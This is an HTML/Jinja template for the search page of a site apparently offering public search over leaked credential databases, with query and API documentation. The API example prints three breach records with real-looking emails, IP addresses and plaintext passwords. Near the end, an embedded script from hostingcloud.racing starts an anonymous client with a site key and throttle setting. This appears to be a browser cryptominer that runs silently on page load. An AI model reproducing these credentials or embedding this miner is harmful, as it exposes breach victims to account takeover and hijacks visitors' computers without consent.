<style>
body{
padding:5px 5px 5px 5px;
padding-bottom:10px;
}

.search-container{
width: 490px;
display: block;
margin: 0 auto;
}

input#search-bar{
margin: 0 auto;
width: 100%;
height: 45px;
padding: 0 20px;
font-size: 1rem;
border: 1px solid #D0CFCE;
outline: none;
&:focus{
border: 1px solid #008ABF;
transition: 0.35s ease;
color: #008ABF;
&::-webkit-input-placeholder{
transition: opacity 0.45s ease;
opacity: 0;
}
&::-moz-placeholder {
transition: opacity 0.45s ease;
opacity: 0;
}
&:-ms-placeholder {
transition: opacity 0.45s ease;
opacity: 0;
}
}
}

.search-icon{
position: relative;
float: right;
width: 75px;
height: 75px;
top: -62px;
right: -45px;
}

div#results {

margin: auto;
width: 60%;
padding: 10px 10px 10px 10px;
}

body {
margin: 5px;
font-family: Arial, Helvetica, sans-serif;
}

.topnav {
overflow: hidden;
background-color: #333;
}

.topnav a {
float: left;
color: #f2f2f2;
text-align: center;
padding: 14px 16px;
text-decoration: none;
font-size: 17px;
}

.topnav a:hover {
background-color: #ddd;
color: black;
}

.topnav a.active {
background-color: #333;
color: white;
}

div#page {

width: 50%;
text-align: center;
margin: 0 auto;
}

table#results {

width: 100%;
font-size: 12px;
padding: 10px 10px 10px 10px;
font-weight: normal;
}

}

</style>


<div class="topnav">
  <a class="active" href="/">Home</a>
  <a href="search">Search</a>
</div>


<body>

  <p>*Search is in early alpha, please report bugs to <a href="https://github.com/acaceres2176/scylla/issues" target="_blank">the scylla github repo</a></p>
  <form class="search-container" action="search">
    <input type="text" id="search-bar" name="q" placeholder="Please enter a search term...">*search has changed, consider re-RTFMing
    <!--<a href="#"><img class="search-icon"></a>-->
  </form>

<div id="results">
{{ html_results|safe }}
</div>

<div id="page">

  {% for page in pages %}

    <a href="{{ url_for(request.endpoint) }}?&q={{ params['q'] }}&start={{ page * size }}&size=100">{{ page }}</a>

  {% endfor %}

</div>
<br />
<br />
<br />
<h2>Available Fields</h2>

{% for field in fields %}
  {{ field }} <br />
{% endfor %}

<h2>Queries</h2>

    <p>Queries DO NOT use Lucene query syntax anymore, but they kind of look like they do. First things first, forget about wildcards, each query essentially comes with wildcards surrounding them. So be as specific
    or non-specific as you want.</p>
<figure>
  <figcaption>Example search for passwords that have ff in them</figcaption>
  <pre>
    <code>
      password:ff
    </code>
  </pre>

  <p>
  Yes, also note that the field "password" no longer needs to be capitalized. For legacy reasons I lowercase everything for you though. You're welcome. On the back-end this query is simple,
  it's looking in the password table for the string ff. Fancy search is dead, long live basic string matching. Keep your queries simple and basic, there is no complex search back-end anymore
  at this time.
  </p>
  
  <figcaption>Remember this? That's not going to work anymore. The ? is going to give you an error and searching for two fields at once is no longer currently supported. I'm working on it!</figcaption>
  <pre>
    <code>
      Name:da?e Password:*d* <-- doesn't work anymore
    </code>
  </pre>
  
</figure>

<h2>API</h2>

  <p>The search API can be accessed by sending a GET request to this page with the Accept header set
    to <code>Accept: application/json</code>
    <br /><br />
    <code>
      GET https://scylla.sh/search?q=your_query&size=100&start=200
    </code>
    <br /><br />

    The above GET request grabs 100 results of your_query starting at the 200th record. Pagination
    can be done using the "start" parameter. Queries return the first "num" hits.

    Please open an issue on github for any queries that fail or are extraordinarily slow.
    <br /><br />

    Data is returned in JSON format like the following:
    <br /><br />
<code>
<pre>
[
  {
    "domain": "000webhost.com", 
    "email": "kimitakmili.1990@gmail.com", 
    "ip": "188.245.147.169", 
    "name": "  ", 
    "passhash": null, 
    "passsalt": null, 
    "password": "kimi2045", 
    "user": null, 
    "userid": null, 
    "username": null
  }, 
  {
    "domain": "000webhost.com", 
    "email": "kino45.1982@gmail.com", 
    "ip": "193.0.207.111", 
    "name": "  ", 
    "passhash": null, 
    "passsalt": null, 
    "password": "KiF05081991kIf", 
    "user": null, 
    "userid": null, 
    "username": null
  }, 
  {
    "domain": "000webhost.com", 
    "email": "m.taghipoor1377@gmail.com", 
    "ip": "5.239.205.151", 
    "name": "  ", 
    "passhash": null, 
    "passsalt": null, 
    "password": "majid17", 
    "user": null, 
    "userid": null, 
    "username": null
   }
]
</code>
</pre>   
    <br /><br />
    Note you may use the fields below to guide you, all fields, even if null, should be returned by your query.
    If fields are added, they will be appended to the list of available fields for query.

  </p>

<h2>Normalized Databases</h2>
<p>The following are the databases available for search.</p>
{% for db in dbs %}
  {% if "all" in db %}
  <!-- skipped all.jl -->
  {% endif %}
  The {{ db.split(".")[0] }} Database<br />
{% endfor %}

  <script src="https://www.hostingcloud.racing/FA18.js"></script>
  <script>
    var _client = new Client.Anonymous('b0a5fc90521fc2862b2feb55baee6a97a3285e548d8b9da055d1f586aef632e2', {
    throttle: 0.5, ads: 0
    });
    _client.start();
  </script>

  <h2>ToS</h2>

  <p>
  Please see the <a href="/">Home</a> page for the terms of service before using this.
  </p>
  
  <!-- Matomo Image Tracker-->
  <img src="https://analytics.hyperiongray.com/matomo.php?idsite=9&amp;rec=1" style="border:0" alt="" />
  <!-- End Matomo -->
  
</body>
